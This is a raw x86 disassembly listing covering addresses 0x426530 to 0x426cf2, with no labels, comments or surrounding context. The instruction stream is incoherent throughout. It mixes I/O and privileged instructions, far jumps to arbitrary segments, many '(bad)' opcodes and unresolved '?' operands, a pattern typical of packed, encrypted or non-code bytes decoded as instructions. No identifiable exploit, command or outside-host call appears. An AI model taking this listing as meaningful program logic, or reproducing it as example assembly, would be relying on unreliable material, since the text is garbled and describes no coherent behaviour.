  426530:	sub    ebx,DWORD PTR [esi+0x6e]
  426533:	xor    BYTE PTR [ebx+edi*8-0x12a6baab],al
  42653a:	mov    ch,0xd0
  42653c:	hlt    
  42653d:	sub    dh,cl
  42653f:	lahf   
  426540:	add    edi,0xffffff92
  426543:	loope  0x4264ef
  426545:	pusha  
  426546:	adc    bh,al
  426548:	adc    BYTE PTR [ebx],al
  42654a:	pop    ebp
  42654b:	pop    edi
  42654c:	sbb    BYTE PTR [eax-0xce8e3fd],0xd2
  426553:	fld    TBYTE PTR [edx+0x7]
  426556:	mov    al,ds:0xdfb2923d
  42655b:	sti    
  42655c:	sahf   
  42655d:	add    esp,DWORD PTR [edx+edi*1+0x20]
  426561:	icebp  
  426562:	cwde   
  426563:	push   ebp
  426564:	fst    DWORD PTR [esi+eiz*1-0x61246b2c]
  42656b:	and    eax,0x5e4c7eef
  426570:	pop    eax
  426571:	imul   BYTE PTR [edx+ecx*4+0x0]
  426575:	inc    edx
  426576:	pop    esp
  426577:	dec    ecx
  426578:	(bad)  
  42657a:	cmovae ecx,DWORD PTR [edx]
  42657d:	mov    ds:0xa43f7255,eax
  426582:	repnz fldcw WORD PTR ds:[eax+0x2e8b8633]
  42658a:	fild   WORD PTR ds:0x1a40be3e
  426590:	ret    0x70c4
  426593:	xchg   BYTE PTR ds:[edx],dl
  426596:	cmp    DWORD PTR [esi+0x6a61989b],eax
  42659c:	sub    ah,BYTE PTR [ebp-0x27]
  42659f:	pop    esi
  4265a0:	add    al,bl
  4265a2:	fdiv   QWORD PTR [ebp+0x4d]
  4265a5:	and    edi,edx
  4265a7:	dec    eax
  4265a8:	lds    ecx,FWORD PTR [esi+ebx*2+0x15]
  4265ac:	pop    esp
  4265ad:	cli    
  4265ae:	jnp    0x4265f0
  4265b0:	mov    dh,0x5e
  4265b2:	pop    ebx
  4265b3:	and    BYTE PTR [eax+0x3e],dh
  4265b6:	sbb    ebp,eax
  4265b8:	fs cld 
  4265ba:	in     eax,dx
  4265bb:	in     eax,dx
  4265bc:	jo     0x4265ff
  4265be:	cmp    eax,0xa64475ec
  4265c3:	cmp    ebx,DWORD PTR [ebx+0x4]
  4265c6:	pushf  
  4265c7:	mov    edi,0xb3cdbf57
  4265cc:	mov    DWORD PTR [ecx-0x57296274],eax
  4265d2:	fisub  WORD PTR [edx-0x1f696614]
  4265d8:	mov    bh,0x16
  4265da:	test   BYTE PTR [esp+eax*2],cl
  4265dd:	hlt    
  4265de:	and    dl,BYTE PTR [ecx+0x3e]
  4265e1:	ret    
  4265e2:	into   
  4265e3:	sub    al,0x8e
  4265e5:	enter  0x4d95,0x90
  4265e9:	ss enter 0x4a26,0xa3
  4265ee:	inc    ebp
  4265ef:	adc    ch,0x5e
  4265f2:	jge    0x426661
  4265f4:	pop    eax
  4265f5:	fisub  WORD PTR [esi-0x11]
  4265f8:	adc    ecx,DWORD PTR [edx-0x2d]
  4265fb:	sbb    eax,DWORD PTR [esi-0x72af8843]
  426601:	mov    cl,0x70
  426603:	jnp    0x4265c4
  426605:	in     eax,dx
  426606:	ins    BYTE PTR es:[edi],dx
  426607:	popf   
  426608:	ins    BYTE PTR es:[edi],dx
  426609:	push   eax
  42660a:	das    
  42660b:	pop    esp
  42660c:	push   0x33
  42660e:	jnp    0x426625
  426610:	je     0x426607
  426612:	or     DWORD PTR [ebx-0x52bc3192],0xd4908311
  42661c:	gs pop ebx
  42661e:	jno    0x426646
  426620:	call   0x26f11968
  426625:	cmp    DWORD PTR [ebx+0x51],edx
  426628:	cld    
  426629:	dec    esi
  42662a:	or     BYTE PTR [edx-0x41307931],cl
  426630:	test   eax,0x99c27235
  426635:	or     esp,DWORD PTR [ebp+0x24]
  426638:	cdq    
  426639:	fmul   st(7),st
  42663b:	out    dx,eax
  42663c:	enter  0xd66f,0x5f
  426640:	adc    DWORD PTR [edi+ebx*1-0xa],esi
  426644:	sub    DWORD PTR [edi-0x64a613c5],esp
  42664a:	or     eax,0x28c4757
  42664f:	mov    ebp,0x22a4af7
  426654:	pop    ebp
  426655:	inc    ebx
  426656:	call   0xd2ed:0x12e6ee3d
  42665d:	retf   
  42665e:	add    al,0x88
  426660:	sbb    bh,BYTE PTR [edi]
  426662:	mov    dl,0xed
  426664:	sbb    BYTE PTR [ebx+ecx*2-0x241ce9ba],0x9
  42666c:	cld    
  42666d:	fcomip st,st(3)
  42666f:	lds    edi,FWORD PTR [ebp+0x4cd49485]
  426675:	push   esp
  426676:	stos   DWORD PTR es:[edi],eax
  426677:	push   edi
  426678:	mov    ebx,0x4522d27c
  42667d:	xor    BYTE PTR [eax+0x4c],bh
  426680:	sbb    al,0xb4
  426682:	xor    BYTE PTR [esi-0x66d454bc],ah
  426688:	neg    BYTE PTR [edx]
  42668a:	dec    esp
  42668b:	cdq    
  42668c:	cmp    eax,0x860688ad
  426691:	jp     0x426657
  426693:	out    dx,al
  426694:	push   ebx
  426695:	enter  0x9b00,0x1b
  426699:	add    eax,0x9f4744e2
  42669e:	adc    eax,0x956d030a
  4266a3:	ins    BYTE PTR es:[edi],dx
  4266a4:	ret    0xf0a3
  4266a7:	cmc    
  4266a8:	add    BYTE PTR [eax+0x6eda39a1],cl
  4266ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266af:	clc    
  4266b0:	hlt    
  4266b1:	xchg   edx,ebx
  4266b3:	or     al,ah
  4266b5:	push   esi
  4266b6:	sti    
  4266b7:	les    ebp,FWORD PTR [esi-0x760a68b0]
  4266bd:	fincstp 
  4266bf:	ret    
  4266c0:	aas    
  4266c1:	sub    edx,edx
  4266c3:	xchg   edx,eax
  4266c4:	jmp    0x20e65d2a
  4266c9:	jne    0x426698
  4266cb:	and    DWORD PTR [esp+ecx*1+0x7b9ae175],0x1d
  4266d3:	mov    dl,0x3d
  4266d5:	jmp    0xd977:0x59a2b61a
  4266dc:	adc    al,0xf5
  4266de:	push   esp
  4266df:	cmp    al,0x26
  4266e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266e2:	xchg   esi,eax
  4266e3:	xchg   esi,eax
  4266e4:	pop    ebx
  4266e5:	das    
  4266e6:	dec    eax
  4266e7:	cwde   
  4266e8:	cwde   
  4266e9:	mov    esp,0x5927b020
  4266ee:	mov    WORD PTR [ebx+edx*1+0x23],?
  4266f2:	push   ebp
  4266f3:	lods   al,BYTE PTR ds:[esi]
  4266f4:	fst    DWORD PTR [edx+edi*4+0x1a02ce7f]
  4266fb:	daa    
  4266fc:	sbb    DWORD PTR [edi],ebx
  4266fe:	out    dx,al
  4266ff:	fist   DWORD PTR [eax-0x71]
  426702:	(bad)
  426705:	pop    ebp
  426706:	lods   eax,DWORD PTR ds:[esi]
  426707:	sbb    ah,BYTE PTR [esi]
  426709:	call   0x2a7be2bf
  42670e:	std    
  42670f:	cmp    BYTE PTR [edx],bh
  426711:	retf   0x8cb6
  426714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426715:	jge    0x4266ce
  426717:	ret    
  426718:	dec    ebp
  426719:	adc    BYTE PTR [ecx],0x10
  42671c:	mov    ds:0x58be4823,al
  426721:	and    al,BYTE PTR [eax+0x5612e6d5]
  426727:	cmp    DWORD PTR [ebp+eax*1-0x5f20120b],ecx
  42672e:	scas   al,BYTE PTR es:[edi]
  42672f:	dec    ecx
  426730:	xchg   ecx,eax
  426731:	and    al,0xda
  426733:	bound  esp,QWORD PTR [ebx]
  426735:	lds    eax,FWORD PTR [ebx-0x95312bf]
  42673b:	xor    al,0x5f
  42673d:	push   es
  42673e:	jnp    0x426759
  426740:	xor    al,0xfb
  426742:	aaa    
  426743:	mov    ds:0x851454dd,al
  426748:	scas   al,BYTE PTR es:[edi]
  426749:	mov    ch,0x5a
  42674b:	shl    BYTE PTR [ebx],1
  42674d:	outs   dx,BYTE PTR ds:[esi]
  42674e:	xor    ebx,DWORD PTR [eax+0x480496f6]
  426754:	jle    0x42671f
  426756:	cs jae 0x42670d
  426759:	push   edx
  42675a:	fldcw  WORD PTR [eax+0x5779b937]
  426760:	femms  
  426762:	mov    esi,DWORD PTR [ebp+0x1605838e]
  426768:	mov    bl,0xc4
  42676a:	(bad)  
  42676b:	cdq    
  42676c:	push   ecx
  42676d:	or     DWORD PTR [ebx-0x32],edx
  426770:	and    BYTE PTR [edi],bh
  426772:	imul   ebp,edx,0xd4ce3121
  426778:	xor    cl,BYTE PTR [ebp-0x55]
  42677b:	repz shl dh,0x48
  42677f:	jne    0x426768
  426781:	xchg   esi,eax
  426782:	fisttp WORD PTR [esi-0x1c]
  426785:	in     al,dx
  426786:	jns    0x42676e
  426788:	mov    dh,0xb5
  42678a:	adc    DWORD PTR [edx+0x41],esi
  42678d:	add    BYTE PTR [eax],al
  42678f:	add    BYTE PTR [eax],al
  426791:	add    BYTE PTR [ecx-0x126c16dc],al
  426797:	(bad)  
  426799:	ss cwde 
  42679b:	in     eax,0x27
  42679d:	inc    esp
  42679e:	call   0x1df:0xbb52c384
  4267a5:	add    bl,dh
  4267a7:	add    al,0x0
  4267a9:	add    BYTE PTR [esp-0x7487a9f7],bh
  4267b0:	gs mov edi,eax
  4267b3:	push   edx
  4267b4:	jmp    DWORD PTR [ecx-0x25]
  4267b7:	push   ecx
  4267b8:	mov    eax,0x848ff580
  4267bd:	adc    esi,ecx
  4267bf:	fild   QWORD PTR [ecx+0x1101d3b4]
  4267c5:	inc    esp
  4267c6:	inc    edi
  4267c7:	aad    0xd4
  4267c9:	mov    ebp,0x2c020ccf
  4267ce:	dec    eax
  4267cf:	sub    ecx,ebp
  4267d1:	mul    eax
  4267d3:	jns    0x4267cc
  4267d5:	sbb    BYTE PTR [esi],dh
  4267d7:	(bad)  [edx-0x3ec701fe]
  4267dd:	push   esi
  4267de:	cmp    bl,BYTE PTR [edi+ebp*8-0x3dacb7ca]
  4267e5:	shr    DWORD PTR [eax],cl
  4267e7:	dec    esi
  4267e8:	inc    ebx
  4267e9:	or     eax,0xe6fbb454
  4267ee:	push   cs
  4267ef:	fnclex 
  4267f1:	out    dx,eax
  4267f2:	loop   0x426852
  4267f4:	in     eax,0xa6
  4267f6:	fs cdq 
  4267f8:	fst    DWORD PTR [edx]
  4267fa:	xchg   BYTE PTR [esi-0x51],dl
  4267fd:	(bad)  
  4267ff:	popf   
  426800:	nop
  426801:	retf   
  426802:	test   eax,0x7e25eed
  426807:	outs   dx,DWORD PTR ds:[esi]
  426808:	push   esi
  426809:	leave  
  42680a:	jns    0x4267ce
  42680c:	out    0x22,al
  42680e:	into   
  42680f:	inc    ecx
  426810:	mov    ds:0x775a8dca,al
  426815:	in     eax,0xb
  426817:	adc    al,BYTE PTR [ebx-0x39db14db]
  42681d:	xlat   BYTE PTR ds:[ebx]
  42681e:	loop   0x42686e
  426820:	inc    ebp
  426821:	into   
  426822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426823:	pop    ebx
  426824:	sti    
  426825:	rol    BYTE PTR [ebp+eiz*1+0x7379d644],cl
  42682c:	xchg   al,cl
  42682e:	dec    ebp
  42682f:	pusha  
  426830:	gs cwde 
  426832:	les    eax,FWORD PTR [ecx]
  426834:	cmp    al,0xbf
  426836:	cld    
  426837:	pusha  
  426838:	pop    ebp
  426839:	sub    al,0xdf
  42683b:	sub    dl,BYTE PTR [edx]
  42683d:	(bad)  
  42683e:	call   0xe6186362
  426843:	push   ss
  426844:	push   edx
  426845:	out    0x3f,al
  426847:	xchg   DWORD PTR [ebx+0x36],esi
  42684a:	sbb    al,0xc3
  42684c:	aad    0xaf
  42684e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42684f:	mov    WORD PTR [ecx],es
  426851:	lds    esp,FWORD PTR [ebp+0x5a]
  426854:	jb     0x426845
  426856:	mov    al,0x57
  426858:	cmp    DWORD PTR [edi+0x14],edi
  42685b:	mov    ds:0x63dc4e1a,al
  426860:	push   es
  426861:	cmp    al,0xef
  426863:	jns    0x4268e2
  426865:	test   BYTE PTR [edx-0x1a],ah
  426868:	je     0x426868
  42686a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42686b:	(bad)  
  42686c:	push   esp
  42686d:	fsubr  st,st(1)
  42686f:	pushf  
  426870:	adc    eax,DWORD PTR [esi+0x610da148]
  426876:	push   eax
  426877:	mov    ebx,0x82ad7881
  42687c:	fisubr DWORD PTR [eax+eax*4-0x28]
  426880:	test   BYTE PTR [esi+eiz*2-0x5d],ch
  426884:	adc    bl,BYTE PTR [ecx]
  426886:	sbb    dl,dh
  426888:	or     DWORD PTR [ebx+eiz*4+0x67c80b85],esi
  42688f:	pop    ecx
  426890:	adc    dl,BYTE PTR [edx]
  426892:	shl    BYTE PTR [ebp-0x6d],1
  426895:	ffree  st(6)
  426897:	adc    ebx,DWORD PTR [ecx]
  426899:	out    0x94,eax
  42689b:	sahf   
  42689c:	in     al,dx
  42689d:	test   al,0x29
  42689f:	xor    esp,DWORD PTR [edi-0x2a]
  4268a2:	xchg   esp,eax
  4268a3:	xchg   esp,eax
  4268a4:	sub    al,0xb4
  4268a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268a7:	sub    edx,0xce9d0a1f
  4268ad:	cmp    edx,DWORD PTR [ebx-0x68]
  4268b0:	fidivr WORD PTR [esi]
  4268b2:	jg     0x42688e
  4268b4:	ret    
  4268b5:	into   
  4268b6:	inc    esp
  4268b7:	scas   eax,DWORD PTR es:[edi]
  4268b8:	jmp    0x924cac5f
  4268bd:	xor    eax,0xe0ed9d0a
  4268c2:	jp     0x4268a0
  4268c4:	pushf  
  4268c5:	dec    esi
  4268c6:	dec    ebp
  4268c7:	mov    ecx,0x8f9accbf
  4268cc:	push   ecx
  4268cd:	ins    BYTE PTR es:[edi],dx
  4268ce:	inc    ebx
  4268cf:	push   0xffffffa2
  4268d1:	push   ebx
  4268d2:	bound  ebx,QWORD PTR [ecx+0x18]
  4268d5:	sub    cl,BYTE PTR [eax-0x53235eca]
  4268db:	stos   BYTE PTR es:[edi],al
  4268dc:	push   ebx
  4268dd:	rcr    BYTE PTR [esi],1
  4268df:	loop   0x4268e8
  4268e1:	inc    edx
  4268e2:	sub    esi,eax
  4268e4:	sbb    al,0xf0
  4268e6:	mov    cl,0x20
  4268e8:	or     DWORD PTR [edx+0x14975272],eax
  4268ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268ef:	dec    ecx
  4268f0:	fild   QWORD PTR [ecx]
  4268f2:	scas   eax,DWORD PTR es:[edi]
  4268f3:	mov    BYTE PTR [esi+ebx*1],al
  4268f6:	lods   eax,DWORD PTR ds:[esi]
  4268f7:	mov    edx,0x1865833
  4268fc:	mov    bh,0x86
  4268fe:	xlat   BYTE PTR ds:[ebx]
  4268ff:	cdq    
  426900:	inc    eax
  426901:	dec    eax
  426902:	sbb    eax,0xcb4bb3e1
  426907:	push   edi
  426908:	add    ebx,0xd49cffd7
  42690e:	js     0x4268b7
  426910:	outs   dx,DWORD PTR ds:[esi]
  426911:	adc    BYTE PTR [esi-0x297b2828],bh
  426917:	or     DWORD PTR [ebp-0x506c8b46],eax
  42691d:	rcl    BYTE PTR [edx-0x3d],0xc0
  426921:	(bad)  
  426922:	push   ebp
  426923:	inc    ecx
  426924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426925:	(bad)  
  426927:	add    DWORD PTR [edx+edi*8],ebp
  42692a:	xchg   edi,eax
  42692b:	adc    dh,BYTE PTR [edx-0x50]
  42692e:	leave  
  42692f:	adc    al,0x79
  426931:	lock cli 
  426933:	add    ecx,eax
  426935:	sub    eax,0xcf5a1847
  42693a:	xor    bl,BYTE PTR [ecx+0x1b320454]
  426940:	inc    ebp
  426941:	daa    
  426942:	test   eax,0x7f4122e
  426947:	pop    ds
  426948:	sub    eax,0x369e96cd
  42694d:	lods   al,BYTE PTR ds:[esi]
  42694e:	test   DWORD PTR [eax],0x9a494dc4
  426954:	icebp  
  426955:	xor    eax,0x474437ec
  42695a:	xchg   edx,eax
  42695b:	aas    
  42695c:	enter  0xbc1b,0x9a
  426960:	sbb    eax,0x2c3615b2
  426965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426966:	cli    
  426967:	fsubr  QWORD PTR [edi-0x25c0ded4]
  42696d:	lods   eax,DWORD PTR ds:[esi]
  42696e:	imul   eax,edi,0x87ee66bb
  426974:	loop   0x426919
  426976:	lea    edx,[ebp-0x14]
  426979:	lds    ebp,FWORD PTR [edi+0x79]
  42697c:	les    esp,FWORD PTR [ebp+0x45166480]
  426982:	mov    esp,esp
  426984:	xchg   DWORD PTR [ecx+0x7e],eax
  426987:	and    ecx,DWORD PTR [edi-0x42220bf1]
  42698d:	iret   
  42698e:	xor    al,0x19
  426990:	push   es
  426991:	push   cs
  426992:	and    ah,BYTE PTR [edx-0x4f]
  426995:	dec    esi
  426996:	xor    esi,DWORD PTR [edx+0x4b]
  426999:	jns    0x4269d9
  42699b:	pusha  
  42699c:	xor    cl,al
  42699e:	jmp    0x426a11
  4269a0:	dec    ecx
  4269a1:	test   eax,0xf8777a5
  4269a6:	fiadd  DWORD PTR [edx+0x4a]
  4269a9:	stc    
  4269aa:	test   BYTE PTR fs:[ecx],bh
  4269ad:	ret    
  4269ae:	lds    esi,FWORD PTR [ebx]
  4269b0:	jl     0x426949
  4269b2:	sub    al,0xb4
  4269b4:	sub    eax,0x307d7174
  4269b9:	pop    ebx
  4269ba:	(bad)  
  4269bb:	div    DWORD PTR [esi+0x47cf6fbb]
  4269c1:	gs out 0x6c,al
  4269c4:	leave  
  4269c5:	inc    esi
  4269c6:	into   
  4269c7:	aad    0x1e
  4269c9:	xor    al,0xd8
  4269cb:	adc    eax,0x4952e3ff
  4269d0:	stc    
  4269d1:	mov    DWORD PTR [ecx-0x2d],ebx
  4269d4:	std    
  4269d5:	out    dx,al
  4269d6:	jmp    0x58f0:0xa61135ae
  4269dd:	sub    dl,cl
  4269df:	sbb    BYTE PTR [ecx+0x3da9486b],ch
  4269e5:	mov    DWORD PTR [ecx+0x1673c2af],0xde91af41
  4269ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269f0:	and    al,0xbe
  4269f2:	loop   0x42698b
  4269f4:	je     0x4269f7
  4269f6:	lods   al,BYTE PTR ds:[esi]
  4269f7:	mov    eax,0x6c762b1a
  4269fc:	xchg   DWORD PTR [edi+edx*2-0x5173e66b],ecx
  426a03:	jge    0x426a78
  426a05:	xchg   ecx,eax
  426a06:	pop    edx
  426a07:	inc    edx
  426a08:	outs   dx,DWORD PTR ds:[esi]
  426a09:	push   ebx
  426a0a:	jl     0x426a4c
  426a0c:	test   BYTE PTR [eax-0x77072711],cl
  426a12:	adc    ch,BYTE PTR [ecx+eiz*4-0x6]
  426a16:	mov    cs:0x832cfece,al
  426a1c:	xchg   ecx,eax
  426a1d:	sub    eax,ebp
  426a1f:	retf   0x8f71
  426a22:	push   0x3705a02b
  426a27:	push   cs
  426a28:	ja     0x4269cc
  426a2a:	gs ret 
  426a2c:	push   cs
  426a2d:	mov    WORD PTR [ebp-0x137dba4a],es
  426a33:	loop   0x426aa8
  426a35:	mov    al,ds:0xee67e891
  426a3a:	push   ds
  426a3b:	and    dh,ah
  426a3d:	ss test al,0x8a
  426a40:	ss jno 0x426a14
  426a43:	cmp    DWORD PTR [esi-0x1c],0xe97e7994
  426a4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a4b:	xchg   edx,eax
  426a4c:	pop    ebx
  426a4d:	fmul   st(3),st
  426a4f:	mov    ds:0x227c916f,eax
  426a54:	aad    0x5c
  426a56:	mov    ch,dl
  426a58:	sub    al,0xe9
  426a5a:	ret    0xd50f
  426a5d:	test   BYTE PTR [esi+eax*2-0x957a42b],bh
  426a64:	in     eax,0x65
  426a66:	pop    edi
  426a67:	mov    al,cl
  426a69:	in     eax,dx
  426a6a:	dec    ecx
  426a6b:	sub    BYTE PTR [eax-0x334b7afd],bl
  426a71:	push   ebp
  426a72:	lds    edx,FWORD PTR [edx+ecx*8+0x65]
  426a76:	xchg   esi,eax
  426a77:	fadd   QWORD PTR [ebp-0x19792ea3]
  426a7d:	cs sub al,0x97
  426a80:	(bad)  
  426a81:	test   eax,0x6a386663
  426a86:	pop    ss
  426a87:	sbb    BYTE PTR [eax],dl
  426a89:	call   0xbe52:0xf8996a16
  426a90:	gs push edi
  426a92:	jg     0x426aff
  426a94:	jp     0x426a3b
  426a96:	jmp    0x426a22
  426a98:	clc    
  426a99:	mov    WORD PTR ds:0x47209da7,ds
  426a9f:	mov    ds:0x46892f4c,al
  426aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aa5:	loopne 0x426aa9
  426aa7:	test   ebp,0xb6f2e8e3
  426aad:	adc    esi,ecx
  426aaf:	xchg   ebx,eax
  426ab0:	cmp    edx,DWORD PTR [edx-0x71]
  426ab3:	inc    edi
  426ab4:	scas   al,BYTE PTR es:[edi]
  426ab5:	cmp    ebp,DWORD PTR [eax+0x9073f46]
  426abb:	iret   
  426abc:	aam    0x43
  426abe:	dec    DWORD PTR [ecx-0x18e86508]
  426ac4:	div    DWORD PTR [ecx+eiz*1+0x5f]
  426ac8:	push   ss
  426ac9:	sub    al,0x52
  426acb:	shl    DWORD PTR ds:0xa1362fba,1
  426ad1:	test   eax,0x2f1b6531
  426ad6:	jb     0x426a84
  426ad8:	test   BYTE PTR [edx+0x12],bl
  426adb:	cdq    
  426adc:	mov    bh,0x3b
  426ade:	std    
  426adf:	xchg   edx,eax
  426ae0:	sbb    al,0xe9
  426ae2:	jp     0x426a72
  426ae4:	xchg   ecx,eax
  426ae5:	aaa    
  426ae6:	popa   
  426ae7:	jge    0x426ad9
  426ae9:	mov    al,ds:0x82e0040f
  426aee:	mov    al,0xe3
  426af0:	mov    ebx,0x44efa2f9
  426af5:	popf   
  426af6:	aas    
  426af7:	mov    bl,cl
  426af9:	mov    ecx,0xcfceb452
  426afe:	pusha  
  426aff:	sub    cl,dl
  426b01:	out    dx,al
  426b02:	adc    edx,esp
  426b04:	shl    BYTE PTR [esi-0x7d9bc77f],cl
  426b0a:	pop    eax
  426b0b:	fwait
  426b0c:	inc    eax
  426b0d:	sub    al,0x30
  426b0f:	das    
  426b10:	mov    bh,0x4f
  426b12:	xor    eax,0x64a18ddd
  426b17:	ret    
  426b18:	mov    dl,BYTE PTR [ebp+0x15]
  426b1b:	mov    ch,0xf6
  426b1d:	xor    dh,dh
  426b1f:	or     BYTE PTR [edi],ch
  426b21:	xchg   edi,eax
  426b22:	sbb    dl,dh
  426b24:	cmc    
  426b25:	adc    ch,BYTE PTR [ebx]
  426b27:	loopne 0x426b2a
  426b29:	rcl    DWORD PTR [edi-0x66],0x96
  426b2d:	xlat   BYTE PTR cs:[ebx]
  426b2f:	pop    ebx
  426b30:	out    0x32,eax
  426b32:	xor    ah,bh
  426b34:	mov    ch,0xe1
  426b36:	mov    es,esi
  426b38:	xor    BYTE PTR ds:0x5e6c5a36,0x6c
  426b3f:	cmp    BYTE PTR [esi+0x12],cl
  426b42:	pop    ss
  426b43:	sub    al,0x2
  426b45:	push   esi
  426b46:	dec    ebx
  426b47:	test   DWORD PTR [ebp+0x69],0x91b58900
  426b4e:	dec    ecx
  426b4f:	pop    edx
  426b50:	gs push edi
  426b52:	xor    DWORD PTR [edx],ebx
  426b54:	rcr    BYTE PTR [ebx],1
  426b56:	xchg   BYTE PTR [edx],ah
  426b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b59:	xchg   ebp,eax
  426b5a:	popa   
  426b5b:	add    DWORD PTR [ebx],ebp
  426b5d:	mov    ah,bl
  426b5f:	mov    ds:0xa2a2e510,al
  426b64:	dec    esp
  426b65:	mov    esi,0x507cc3b1
  426b6a:	mov    bh,0x33
  426b6c:	sub    ebx,DWORD PTR [ecx+0x0]
  426b6f:	popa   
  426b70:	lahf   
  426b71:	enter  0xd13d,0xc5
  426b75:	iret   
  426b76:	add    eax,0xfa4b4919
  426b7b:	mov    WORD PTR [ebx*8-0x47892816],?
  426b82:	ds pusha 
  426b84:	xchg   eax,ebp
  426b86:	leave  
  426b87:	in     al,dx
  426b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b89:	xor    al,0x83
  426b8b:	sar    BYTE PTR [ecx+0x6f],1
  426b8e:	in     eax,dx
  426b8f:	mov    esi,eax
  426b91:	imul   esi,DWORD PTR [ebx],0xffffffe7
  426b94:	fld    QWORD PTR [edi]
  426b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b97:	push   esi
  426b98:	xor    esi,DWORD PTR [ecx-0x3544c66]
  426b9e:	into   
  426b9f:	retf   
  426ba0:	inc    esp
  426ba1:	dec    ebx
  426ba2:	leave  
  426ba3:	mov    edi,0x60f8f4e7
  426ba8:	add    al,0x11
  426baa:	mov    eax,fs:0xc3ad0ebe
  426bb0:	xor    DWORD PTR [esi],0xffffffe2
  426bb3:	dec    edx
  426bb4:	push   esp
  426bb5:	(bad)  
  426bb7:	sub    ebp,eax
  426bb9:	and    BYTE PTR [ecx+edi*2-0x80],al
  426bbd:	xchg   edx,eax
  426bbe:	sub    DWORD PTR [ebp-0x676b1ad1],eax
  426bc4:	out    0x9,al
  426bc6:	(bad)  
  426bc7:	jmp    0x6eeb:0xa60dca42
  426bce:	sub    cl,bl
  426bd0:	cmp    edi,DWORD PTR [ebx]
  426bd2:	dec    edi
  426bd3:	mov    ebx,0xd6edf483
  426bd8:	imul   esi,DWORD PTR [esi-0x20c5f054],0x75
  426bdf:	cmp    eax,0x7c774dab
  426be4:	push   edx
  426be5:	icebp  
  426be6:	xchg   esp,eax
  426be7:	mov    BYTE PTR [esi],ah
  426be9:	adc    DWORD PTR [edx+0x1f],ebx
  426bec:	push   ss
  426bed:	daa    
  426bee:	out    0x38,al
  426bf0:	jbe    0x426bba
  426bf2:	jp     0x426c1f
  426bf4:	mov    ch,ah
  426bf6:	shl    BYTE PTR [ebp+0xd],cl
  426bf9:	cmp    ah,bl
  426bfb:	jle    0x426c66
  426bfd:	jmp    0x3070254c
  426c02:	stc    
  426c03:	sbb    BYTE PTR [ebx],ch
  426c05:	icebp  
  426c06:	sub    bh,bh
  426c08:	(bad)  
  426c09:	repnz inc edx
  426c0b:	int3   
  426c0c:	sbb    DWORD PTR [edx+0x5df41676],eax
  426c12:	test   DWORD PTR [edi+0x7938949d],ebp
  426c18:	aad    0xf7
  426c1a:	inc    ecx
  426c1b:	aas    
  426c1c:	sub    esi,DWORD PTR [eax+0xc146b11]
  426c22:	pop    ebp
  426c23:	cli    
  426c24:	daa    
  426c25:	test   al,0x8
  426c27:	push   esp
  426c28:	test   DWORD PTR [ecx-0x695dc4e6],ebp
  426c2e:	popf   
  426c2f:	imul   BYTE PTR [ebx-0x80]
  426c32:	and    eax,0x9ade180d
  426c37:	inc    BYTE PTR [edi]
  426c39:	cwde   
  426c3a:	out    dx,al
  426c3b:	lea    esp,[eax-0x209e2d45]
  426c41:	lock push es
  426c43:	mov    eax,DWORD PTR [edx-0x4ae60754]
  426c49:	push   edx
  426c4a:	mov    bl,dl
  426c4c:	in     al,dx
  426c4d:	popf   
  426c4e:	(bad)  
  426c4f:	popf   
  426c50:	fnstcw WORD PTR [ebx+0x2827b1d8]
  426c56:	popf   
  426c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c58:	or     bl,cl
  426c5a:	in     al,0xb3
  426c5c:	cmc    
  426c5d:	retf   0xf32f
  426c60:	sbb    eax,0xc8faa2ac
  426c65:	(bad)  
  426c66:	mov    edx,0xa5588b3c
  426c6b:	pop    esp
  426c6c:	push   ss
  426c6d:	add    eax,0x3bfbad2a
  426c72:	rcr    bh,cl
  426c74:	int    0x8e
  426c76:	lahf   
  426c77:	and    esp,DWORD PTR [ecx]
  426c79:	sbb    ebx,DWORD PTR [ebp+0x2349fa75]
  426c7f:	adc    BYTE PTR [esp+ecx*4],dh
  426c82:	fisttp WORD PTR [eax+0x3b373a14]
  426c88:	push   eax
  426c89:	cdq    
  426c8a:	out    0xe6,al
  426c8c:	xchg   ecx,eax
  426c8d:	xchg   esp,eax
  426c8e:	outs   dx,DWORD PTR ds:[esi]
  426c8f:	dec    edx
  426c90:	add    al,0x6
  426c92:	adc    ebx,DWORD PTR [ecx+0x3a]
  426c95:	pushf  
  426c96:	fs dec esp
  426c98:	test   al,0xf0
  426c9a:	inc    ebp
  426c9b:	out    0xf2,eax
  426c9d:	add    BYTE PTR [eax],al
  426c9f:	add    BYTE PTR [eax],al
  426ca1:	add    BYTE PTR [esi+0x5f451fc0],dl
  426ca7:	(bad)  
  426ca9:	rol    DWORD PTR [ebx-0x561771f0],cl
  426caf:	scas   al,BYTE PTR es:[edi]
  426cb0:	mov    ebx,0x1e4ae97
  426cb5:	add    bl,dh
  426cb7:	add    al,0x0
  426cb9:	add    BYTE PTR [esi],bl
  426cbb:	pop    ebp
  426cbc:	xor    DWORD PTR [ecx-0x7369890b],ebx
  426cc2:	jbe    0x426cde
  426cc4:	fs stc 
  426cc6:	mov    eax,ds:0x584c2fbb
  426ccb:	adc    eax,0x1f3b5301
  426cd0:	and    ah,BYTE PTR [ebp+0x1e]
  426cd3:	pop    edi
  426cd4:	sti    
  426cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cd6:	add    BYTE PTR [ecx-0x26d8262b],bh
  426cdc:	cmp    BYTE PTR [ecx+ecx*4+0x38],dh
  426ce0:	mov    eax,0xba43bfbd
  426ce5:	hlt    
  426ce6:	xor    BYTE PTR ss:0xa3aff096,cl
  426ced:	adc    eax,0xb121d528
  426cf2:	jne    0x426d67
